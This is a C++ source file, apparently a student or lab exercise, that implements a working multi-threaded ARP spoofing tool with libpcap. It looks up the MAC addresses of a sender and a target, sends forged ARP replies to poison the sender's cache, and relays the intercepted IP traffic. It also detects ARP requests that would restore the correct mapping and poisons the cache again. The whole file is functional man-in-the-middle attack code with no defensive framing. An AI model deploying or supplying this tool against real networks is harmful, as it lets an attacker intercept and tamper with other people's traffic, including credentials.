#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <stdio.h>    	// printf
#include <string.h>   	// strncpy
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>   	// ifreq
#include <unistd.h>   	// close
#include <stdatomic.h>  // thread
#include <pthread.h> 	// thread
#include <sys/wait.h>	// thread

// STRUCT
#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

struct ifreq ifr;
struct flow {
	// SENDER
	Ip sender_ip;
	Mac sender_mac;

	// TARGET
	Ip target_ip;
	Mac target_mac;

	// ATK
	struct attacker* atk;
};

struct attacker {
	char* dev;
	Ip ip;
	Mac mac;
};

// METHOD
void usage() {
	printf("syntax: arp-spoof <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample: arp-spoof wlan0 192.168.10.2 192.168.10.1\n");
}

void iface_to_mac(char* iface) {
	int fd = socket(AF_INET, SOCK_DGRAM, 0);
	if (fd < 0) {
		perror("socket");
		return;
	}
	ifr.ifr_addr.sa_family = AF_INET;
	strncpy(ifr.ifr_name , iface , IFNAMSIZ-1);
	ioctl(fd, SIOCGIFHWADDR, &ifr);
	close(fd);
}

void iface_to_ip(char* iface) {
	int fd = socket(AF_INET, SOCK_DGRAM, 0);
	if (fd < 0) {
		perror("socket");
		return;
	}
	ifr.ifr_addr.sa_family = AF_INET;
	strncpy(ifr.ifr_name , iface , IFNAMSIZ-1);
	ioctl(fd, SIOCGIFADDR, &ifr);
	close(fd);
}

void get_atk_mac(struct attacker* atk) {
	iface_to_mac(atk->dev);
	atk->mac = Mac((unsigned char*)ifr.ifr_hwaddr.sa_data);

	std::string atk_mac_str = std::string(atk->mac);
	printf("Attacker's MAC Address : %s\n", atk_mac_str.c_str());
}

void get_atk_ip(struct attacker* atk) {
	iface_to_ip(atk->dev);
	struct sockaddr_in* ipaddr = (struct sockaddr_in*)&ifr.ifr_addr;
	atk->ip = Ip(inet_ntoa(ipaddr->sin_addr));

	std::string atk_ip_str = std::string(atk->ip);
	printf("Attacker's IP Address : %s\n", atk_ip_str.c_str());
}

// Thread function
void* flow(void* arg) {
	struct flow* flow_info = (struct flow*)arg;
	struct attacker* atk = flow_info->atk;

	printf("Flow : SENDER [%s] / TARGET [%s]\n", 
			std::string(flow_info->sender_ip).c_str(),
			std::string(flow_info->target_ip).c_str());

	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(atk->dev, BUFSIZ, 1, 1000, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", atk->dev, errbuf);
		pthread_exit(NULL);
	}

	// Get Sender MAC
	EthArpPacket getmac_packet;
	getmac_packet.eth_.dmac_ = Mac::broadcastMac();
	getmac_packet.eth_.smac_ = atk->mac;
	getmac_packet.eth_.type_ = htons(EthHdr::Arp);

	getmac_packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	getmac_packet.arp_.pro_ = htons(EthHdr::Ip4);
	getmac_packet.arp_.hln_ = Mac::SIZE;
	getmac_packet.arp_.pln_ = Ip::SIZE;
	getmac_packet.arp_.op_ = htons(ArpHdr::Request);
	getmac_packet.arp_.smac_ = atk->mac;
	getmac_packet.arp_.sip_ = htonl(atk->ip);
	getmac_packet.arp_.tmac_ = Mac::nullMac();
	getmac_packet.arp_.tip_ = htonl(flow_info->sender_ip);

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&getmac_packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		pcap_close(handle);
		pthread_exit(NULL);
	}

	while (1) {
		struct pcap_pkthdr* header;
		const u_char* packet;
		res = pcap_next_ex(handle, &header, &packet);
		if (res == 0) continue;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
			break;
		}

		struct EthArpPacket* recv_packet = (struct EthArpPacket*)packet;
		if (ntohs(recv_packet->eth_.type_) == EthHdr::Arp &&
			ntohs(recv_packet->arp_.op_) == ArpHdr::Reply &&
			recv_packet->arp_.sip_ == Ip(htonl(flow_info->sender_ip))) {
			flow_info->sender_mac = recv_packet->arp_.smac_;
			std::string sender_mac_str = std::string(flow_info->sender_mac);
			printf("Sender's MAC Address : %s\n", sender_mac_str.c_str());
			break;
		}
	}

	// Get Target MAC
	getmac_packet.arp_.tip_ = htonl(flow_info->target_ip);

	res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&getmac_packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		pcap_close(handle);
		pthread_exit(NULL);
	}

	while (1) {
		struct pcap_pkthdr* header;
		const u_char* packet;
		res = pcap_next_ex(handle, &header, &packet);
		if (res == 0) continue;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
			break;
		}

		struct EthArpPacket* recv_packet = (struct EthArpPacket*)packet;
		if (ntohs(recv_packet->eth_.type_) == EthHdr::Arp &&
			ntohs(recv_packet->arp_.op_) == ArpHdr::Reply &&
			recv_packet->arp_.sip_ == Ip(htonl(flow_info->target_ip))) {
			flow_info->target_mac = recv_packet->arp_.smac_;
			std::string target_mac_str = std::string(flow_info->target_mac);
			printf("Target's MAC Address : %s\n", target_mac_str.c_str());
			break;
		}
	}

	// Attack PACKET
	EthArpPacket atk_packet;
	atk_packet.eth_.dmac_ = flow_info->sender_mac;
	atk_packet.eth_.smac_ = atk->mac;
	atk_packet.eth_.type_ = htons(EthHdr::Arp);

	atk_packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	atk_packet.arp_.pro_ = htons(EthHdr::Ip4);
	atk_packet.arp_.hln_ = Mac::SIZE;
	atk_packet.arp_.pln_ = Ip::SIZE;
	atk_packet.arp_.op_ = htons(ArpHdr::Reply);
	atk_packet.arp_.smac_ = atk->mac;
	atk_packet.arp_.sip_ = htonl(flow_info->target_ip);
	atk_packet.arp_.tmac_ = flow_info->sender_mac;
	atk_packet.arp_.tip_ = htonl(flow_info->sender_ip);

	res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&atk_packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}

	// ATTACK
	while (1) {
		struct pcap_pkthdr* header;
		const u_char* packet;
		res = pcap_next_ex(handle, &header, &packet);
		if (res == 0) continue;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
			break;
		}

		// RELAY
		struct EthHdr* recv_packet = (struct EthHdr*)packet;

		if ((recv_packet->smac_ == flow_info->sender_mac) 
				&& (recv_packet->dmac_ == atk->mac) 
				&& ((htons(recv_packet->type_) == EthHdr::Ip4) || (htons(recv_packet->type_) == EthHdr::Ip6))) {
			
			recv_packet->smac_ = atk->mac;
			recv_packet->dmac_ = flow_info->target_mac;

			//std::string sender_mac_str = std::string(recv_packet->smac_);
			//printf("Sender's MAC Address : %s\n", sender_mac_str.c_str());

			//std::string target_mac_str = std::string(recv_packet->dmac_);
			//printf("Target's MAC Address : %s\n", target_mac_str.c_str());

			res = pcap_sendpacket(handle, packet, header->len);

			if (res != 0) {
				fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
			}
			continue;
		}

		// Detect ARP RECOVER
		// 1) Sender's ARP Broadcast
		struct EthArpPacket* sender_broadcast_packet = (struct EthArpPacket*)packet;
		if (ntohs(sender_broadcast_packet->eth_.type_) == EthHdr::Arp &&
			ntohs(sender_broadcast_packet->arp_.op_) == ArpHdr::Request &&
			sender_broadcast_packet->arp_.sip_ == flow_info->sender_ip) {
			
			res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&atk_packet), sizeof(EthArpPacket));
			if (res != 0) {
				fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
			}
			continue;
		}

		// 2) Target's ARP
		struct EthArpPacket* target_broadcast_packet = (struct EthArpPacket*)packet;
		if (ntohs(target_broadcast_packet->eth_.type_) == EthHdr::Arp &&
			ntohs(target_broadcast_packet->arp_.op_) == ArpHdr::Request &&
			target_broadcast_packet->arp_.sip_ == flow_info->target_ip) {
			
			res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&atk_packet), sizeof(EthArpPacket));
			if (res != 0) {
				fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
			}
			continue;
		}

	}

	pcap_close(handle);
	pthread_exit(NULL);
}


int main(int argc, char* argv[]) {
	if (argc < 4 || argc % 2 != 0) {
		usage();
		return -1;
	}

	struct attacker atk;
	atk.dev = argv[1];										// interface
	get_atk_mac(&atk);
	get_atk_ip(&atk);

	int flow_num = (argc - 2) / 2;							// flow array

	pthread_t tids[flow_num];								// thread 배열
	struct flow flow_info[flow_num];
	int status;												// thread status

	for (int i = 0; i < flow_num; i++) {
		flow_info[i].sender_ip = Ip(argv[2 + i * 2]);
		flow_info[i].target_ip = Ip(argv[3 + i * 2]);
		flow_info[i].atk = &atk; 

		status = pthread_create(&tids[i], NULL, flow, (void*)&flow_info[i]);

		if (status != 0) {
			fprintf(stderr, "Couldn't create thread %d\n", i);
			return -1;
		}
	}

	for (int i = 0; i < flow_num; i++) {
		pthread_join(tids[i], NULL);
	}

	return 0;
}
